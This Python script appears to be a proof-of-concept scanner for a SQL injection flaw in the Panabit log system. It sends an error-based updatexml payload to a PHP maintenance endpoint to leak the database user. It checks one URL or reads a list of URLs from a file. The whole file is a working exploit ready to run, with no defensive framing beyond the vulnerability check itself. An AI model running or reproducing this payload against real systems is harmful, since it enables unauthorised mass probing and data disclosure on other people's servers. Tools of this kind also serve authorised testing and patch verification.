# -*- coding: utf-8 -*-
import argparse
import warnings
import requests

warnings.filterwarnings("ignore")

info = "Panabit日志系统SQL注入漏洞"
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
poc = '/Maintain/sprog_deletevent.php?openid=1&id=1 or updatexml(1,concat(0x7e,(user())),0)&cloudip=1'
def check(url):

    try:
        reps = requests.get(url=url + poc, headers=headers, verify=False, timeout=5)
        if reps.status_code == 200 and "XPATH syntax error" in reps.text:
            print(f"存在{info} url : {url}\n{reps.text}")
        else:
            print(f"未发现{info} url : {url}")
    except Exception as e:
        print(f"ERROR : {e}")
def main():
    parser = argparse.ArgumentParser(description='A simple script to demonstrate argparse.')
    parser.add_argument('-u', '--url', type=str, help='URL to process')
    parser.add_argument('-f', '--file', type=str, help='File path to process')

    args = parser.parse_args()
    if args.url:
        check(args.url)

    elif args.file:
        with open(args.file, 'r') as file:
            lines = file.readlines()
            for line in lines:
                check(line.strip())

    else:
        print(f"eg : python3 {info}.py -u http://xx.xx.x.x")
        print(f"eg : python3 {info}.py -f 123.txt")

if __name__ == '__main__':
    main()


